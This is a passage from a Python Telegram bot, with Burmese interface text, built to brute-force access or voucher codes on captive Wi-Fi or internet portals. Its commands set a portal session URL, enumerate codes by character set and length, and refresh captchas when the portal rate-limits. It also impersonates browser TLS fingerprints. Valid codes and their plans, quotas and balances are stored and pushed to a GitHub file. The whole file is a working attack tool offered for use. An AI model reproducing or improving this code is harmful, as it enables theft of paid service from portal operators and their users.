            # ── Progress update ───────────────────────────────────────
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            now = time.monotonic()
            if now - last_progress_update >= PROGRESS_INTERVAL:
                text = format_progress(checked, None, speed, found, target, len(retry_queue))
                try:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=progress_msg.message_id, text=text
                    )
                except:
                    try:
                        new_msg = await bot.send_message(chat_id, text)
                        progress_msg.message_id = new_msg.message_id
                    except:
                        pass
                last_progress_update = now

    finally:
        _cache_clear(cache_key)
        scan_tasks.pop(chat_id, None)


# ══════════════════════════════════════════════════════════════════════════
#  GitHub update scheduler (re-queue on error)
# ══════════════════════════════════════════════════════════════════════════
async def github_update_scheduler():
    while True:
        await asyncio.sleep(GITHUB_INTERVAL)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if not items:
            continue
        try:
            results, sha = await get_file_content("result.json")
            for item in items:
                chat_id = str(item["chat_id"])
                code = item["code"]
                if chat_id not in results:
                    results[chat_id] = []
                if code not in results[chat_id]:
                    results[chat_id].append({
                        "code": code, "plan": item.get("plan", "N/A"),
                        "usage": item.get("usage", "N/A"),
                        "quota": item.get("quota", "N/A")
                    })
            await update_file_content("result.json", results, sha, "Periodic Update")
            logger.info(f"[github] updated {len(items)} items")
        except Exception as e:
            logger.error(f"[github] Update Error: {e}. Re-queuing {len(items)} items.")
            for item in items:
                await SUCCESS_CODE.put(item)


# ══════════════════════════════════════════════════════════════════════════
#  Bot commands
# ══════════════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")


@bot.message_handler(commands=['help'])
async def help_cmd(message):
    help_text = (
        "📚 **Command လမ်းညွှန်**\n\n"
        "၁။ **Setup**: /setup <url>\n\n"
        "၂။ **ရှာဖွေခြင်း**: /brute <mode> <length> [target]\n"
        "   Mode: 1=0-9, 2=a-z, 3=A-Z, 4=a-zA-Z, 5=a-z0-9\n\n"
        "၃။ /stop ၄။ /resume ၅။ /saved ၆။ /delete_saved\n"
        "၇။ /recheck ၈။ /notify ၉။ /filter ၁၀။ /stats"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")


@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url")
        return
    url = args[1]
    await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        cid = message.chat.id
        _, portal_name = get_portal_config(url)
        user_data[cid] = {'session_url': url, 'portal_type': portal_name}
        success_texts.pop(cid, None)
        limited_texts.pop(cid, None)
        last_scan_params.pop(cid, None)
        pending_brute.pop(cid, None)
        success_messages.pop(cid, None)
        limited_messages.pop(cid, None)
        for key in list(captcha_state.keys()):
            if key.startswith(f"{cid}_"):
                _cache_clear(key)
        try:
            results, sha = await get_file_content("result.json")
            if str(cid) in results:
                del results[str(cid)]
                await update_file_content("result.json", results, sha, f"Clear codes for {cid}")
        except Exception as e:
            logger.error(f"[setup] GitHub clear error: {e}")
        await bot.reply_to(message, f"✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n🌐 Portal: {portal_name}")
    else:
        await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")


@bot.message_handler(commands=['filter'])
async def set_filter(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း: /filter 1d,2h,unlimit")
        return
    filters = [f.strip() for f in args[1].split(',') if f.strip()]
    chat_id = message.chat.id
    pending_brute.setdefault(chat_id, {})["plan_filters"] = filters
    last_scan_params.setdefault(chat_id, {})["plan_filters"] = filters
    await bot.reply_to(message, f"✅ Plan filters set: {filters}")


@bot.message_handler(commands=['brute'])
async def brute(message):
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message,
            "အသုံးပြုနည်း: /brute <mode> <length> [target]\n"
            "Mode: 1=0-9, 2=a-z, 3=A-Z, 4=a-zA-Z, 5=a-z0-9"
        )
        return
    try:
        mode = int(args[1]); length = int(args[2])
        target = int(args[3]) if len(args) > 3 else None
        if mode not in [1, 2, 3, 4, 5]:
            await bot.reply_to(message, "❌ Mode သည် 1-5 အတွင်းဖြစ်ရပါမည်။"); return
        if length < 1 or length > 12:
            await bot.reply_to(message, "❌ Length သည် 1-12 အတွင်းဖြစ်ရပါမည်။"); return
        if target is not None and target < 1:
            await bot.reply_to(message, "❌ Target သည် 1 ထက်ကြီးရပါမည်။"); return
    except ValueError:
        await bot.reply_to(message, "❌ Mode, Length, Target များသည် ဂဏန်းဖြစ်ရပါမည်။"); return

    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။"); return

    plan_filters = pending_brute.get(chat_id, {}).get("plan_filters", [])

    if chat_id in last_scan_params and last_scan_params[chat_id].get("mode") is not None:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Resume", callback_data="resume_scan"),
                   InlineKeyboardButton("New Scan", callback_data="new_scan"))
        pending_brute[chat_id] = {"mode": mode, "length": length, "target": target, "plan_filters": plan_filters}
        prev = last_scan_params[chat_id]
        await bot.reply_to(message,
            f"ယခင် scan ရပ်ထားသည် (mode: {prev['mode']}, length: {prev.get('length', '?')}).\n"
            "ပြန်စမလား၊ အသစ်စမလား?", reply_markup=markup)
        return

    await start_brute_scan(chat_id, mode, length, target, message, plan_filters=plan_filters)


async def start_brute_scan(chat_id, mode, length, target, original_message, plan_filters=None):
    plan_filters = plan_filters or []
    filter_note = f" | Filter: {' / '.join(plan_filters)}" if plan_filters else ""
    progress_msg = await bot.send_message(chat_id, f"Preparing...{filter_note}")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode, length, chat_id, user_data[chat_id]['session_url'],
            scan_id, target, message=original_message, progress_msg=progress_msg,
            plan_filters=plan_filters
        )
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)


@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data:
        data["stop"] = True
        if not data["task"].done():
            data["task"].cancel()
        await bot.reply_to(message, "Scan ရပ်ထားပါသည်။ /resume ဖြင့် ပြန်စနိုင်ပါသည်။")
    else:
        await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")


@bot.message_handler(commands=['resume'])
async def resume_scan(message):
    chat_id = message.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။"); return
    params = last_scan_params.pop(chat_id)
    await start_brute_scan(
        chat_id, params['mode'], params.get('length', 6), params.get('target'), message,
        plan_filters=params.get('plan_filters', [])
    )
    await bot.reply_to(message, "ယခင် scan ပြန်စပါပြီ။")


@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text("Resume လုပ်ရန် scan မရှိပါ။", chat_id=chat_id,
                                        message_id=call.message.message_id)
            return
        params = last_scan_params.pop(chat_id)
        await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။", chat_id=chat_id,
                                    message_id=call.message.message_id)
        await start_brute_scan(
            chat_id, params['mode'], params.get('length', 6), params.get('target'), call.message,
            plan_filters=params.get('plan_filters', [])
        )
    else:
        if chat_id in pending_brute:
            params = pending_brute.pop(chat_id)
            last_scan_params.pop(chat_id, None)
            await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။", chat_id=chat_id,
                                        message_id=call.message.message_id)
            await start_brute_scan(
                chat_id, params['mode'], params.get('length', 6), params.get('target'), call.message,
                plan_filters=params.get('plan_filters', [])
            )
        else:
            await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။", chat_id=chat_id,
                                        message_id=call.message.message_id)


@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။"); return

    parts = []
    if success:
        parts.append(f"✅ **Success Codes** ({len(success)})")
        for item in success:
            line = f"`{item['code']}` – ⏳ {item.get('plan', 'N/A')}"
            if item.get("usage", "N/A") != "N/A":
                line += f"\n   📊 Usage: {item['usage']}"
            if item.get("quota", "N/A") != "N/A":
                line += f"\n   💾 Quota: {item['quota']}"
            if item.get("expire", "N/A") != "N/A":
                line += f"\n   📅 Expire: {item['expire']}"
            if item.get("portal", "N/A") != "N/A":
                line += f"\n   🌐 Portal: {item['portal']}"
            parts.append(line); parts.append("")
    if limited:
        parts.append(f"\n⚠️ **Limited Codes** ({len(limited)})")
        parts.extend(limited)

    full_text = "\n".join(parts)
    MAX = 4096
    if len(full_text) > MAX:
        for i in range(0, len(full_text), MAX):
            await bot.send_message(chat_id, full_text[i:i+MAX], parse_mode="Markdown")
    else:
        await bot.reply_to(message, full_text, parse_mode="Markdown")


@bot.message_handler(commands=['delete_saved'])
async def delete_saved(message):
    chat_id = message.chat.id
    success_texts.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)
    try:
        results, sha = await get_file_content("result.json")
        if str(chat_id) in results:
            del results[str(chat_id)]
            await update_file_content("result.json", results, sha, f"Clear codes for {chat_id}")
    except Exception as e:
        logger.error(f"[delete_saved] Error: {e}")
    await bot.reply_to(message, "🗑️ Saved codes များအားလုံးဖျက်ပြီးပါပြီ။")


@bot.message_handler(commands=['notify'])
async def toggle_notify(message):
    chat_id = message.chat.id
    current = notify_setting.get(chat_id, DEFAULT_NOTIFY)
    notify_setting[chat_id] = not current
    state = "ON" if notify_setting[chat_id] else "OFF"
    await bot.reply_to(message, f"Notify: {state}")


@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။"); return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ။"); return

    await bot.reply_to(message, "Success codes များကို ပြန်လည်စစ်ဆေးနေပါသည်...")
    session_url = user_data[chat_id]['session_url']
    portal_config, _ = get_portal_config(session_url)

    acquired = await acquire_session_and_captcha(session_url, portal_config)
    if not acquired:
        await bot.reply_to(message, "❌ Session ရယူ၍ မရပါ။"); return

    new_success = []
    try:
        for item in success:
            res = await perform_check(
                session_url, item["code"], chat_id, recheck=True, message=message,
                shared_session=acquired["session"],
                shared_session_id=acquired["session_id"],
                shared_auth_code=acquired["auth_code"],
                shared_user_agent=acquired["user_agent"],
            )
            if isinstance(res, dict) and res.get("status") == "success":
                new_success.append(item)
            await asyncio.sleep(0.1)
    finally:
        try:
            await acquired["session"].close()
        except:
            pass

    if new_success:
        success_texts[chat_id] = new_success
        codes_str = "\n".join([i["code"] for i in new_success])
        await bot.reply_to(message, f"✅ Rechecked Codes:\n{codes_str}")
    else:
        success_texts[chat_id] = []
        await bot.reply_to(message, "Recheck ပြီးပါပြီ၊ success code တစ်ခုမျှမကျန်ပါ။")


@bot.message_handler(commands=['stats'])
async def stats(message):
    chat_id = message.chat.id
    total_success = sum(len(v) for v in success_texts.values())
    total_limited = sum(len(v) for v in limited_texts.values())
    await bot.reply_to(message,
        f"📊 Stats\n"
        f"✅ Success (total): {total_success}\n"
        f"⚠️ Limited (total): {total_limited}\n"
        f"👤 Your success: {len(success_texts.get(chat_id, []))}\n"
        f"👤 Your limited: {len(limited_texts.get(chat_id, []))}"
    )


@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission"); return
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"👥 Sessions Loaded: {len(user_data)}\n"
        f"⚡ Concurrency: {CONCURRENCY}\n"
        f"📦 Batch Size: {BATCH_SIZE}\n"
        f"🔒 Captcha Cache: {len(captcha_state)}\n"
        f"🌐 Default Portal: {DEFAULT_PORTAL}\n"
        f"🔐 TLS Impersonation: {'Enabled (curl_cffi)' if CURL_CFFI_AVAILABLE else 'Disabled'}\n"
        f"🛡️ Rate Limit Policy: Refresh captcha on 'request limited'\n"
        f"🧊 Error Cooldown: {MAX_CONSECUTIVE_ERRORS} errors → {ERROR_COOLDOWN_SECONDS}s"
    )


@bot.message_handler(commands=['testbalance'])
async def testbalance(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission"); return
    chat_id = message.chat.id
    targets = []
    for cid, items in success_texts.items():
        for item in items:
            targets.append({
                "chat_id": cid, "code": item["code"],
                "session_id": item["session_id"],
                "plan": item.get("plan", "N/A"),
                "portal": item.get("portal", "N/A")
            })
    if not targets:
        await bot.reply_to(message, "⚠️ Success code မရှိသေးပါ။"); return

    await bot.reply_to(message, f"🔍 Testing balance for {len(targets)} code(s)...")
    for t in targets[:3]:
        sid = t["session_id"]
        portal_config = PORTAL_CONFIGS.get(t.get("portal", DEFAULT_PORTAL), PORTAL_CONFIGS[DEFAULT_PORTAL])
        balance_info = await get_balance(sid, portal_config)
        result = (
            f"🎯 Code: `{t['code']}`\n"
            f"🔑 Session ID: `{sid}`\n"
            f"🌐 Portal: {t.get('portal')}\n"
            f"⏳ Time: {balance_info.get('time', 'N/A')}\n"
            f"📊 Usage: {balance_info.get('usage', 'N/A')}\n"
            f"💾 Quota: {balance_info.get('quota', 'N/A')}\n"
            f"📋 Plan: {balance_info.get('plan', 'N/A')}\n"
            f"📅 Expire: {balance_info.get('expire', 'N/A')}"
        )
        await bot.send_message(chat_id, result, parse_mode="Markdown")


# ══════════════════════════════════════════════════════════════════════════
#  Polling and main
# ══════════════════════════════════════════════════════════════════════════
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logger.warning(f"Polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            logger.error(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)


async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=500, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)

    stop_event = asyncio.Event()

    def _shutdown():
        logger.info("Shutdown signal received")
        stop_event.set()

    try:
        loop = asyncio.get_event_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig, _shutdown)
            except NotImplementedError:
                pass

        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        polling_task = asyncio.create_task(start_polling())

        await stop_event.wait()
        polling_task.cancel()
        for data in scan_tasks.values():
            if not data["task"].done():
                data["task"].cancel()
        await asyncio.gather(
            *[d["task"] for d in scan_tasks.values() if not d["task"].done()],
            return_exceptions=True
        )
    finally:
        for key in list(captcha_state.keys()):
            _cache_clear(key)
        await session.close()
        await _connector.close()
        logger.info("Shutdown complete")


if __name__ == '__main__':
    asyncio.run(main())
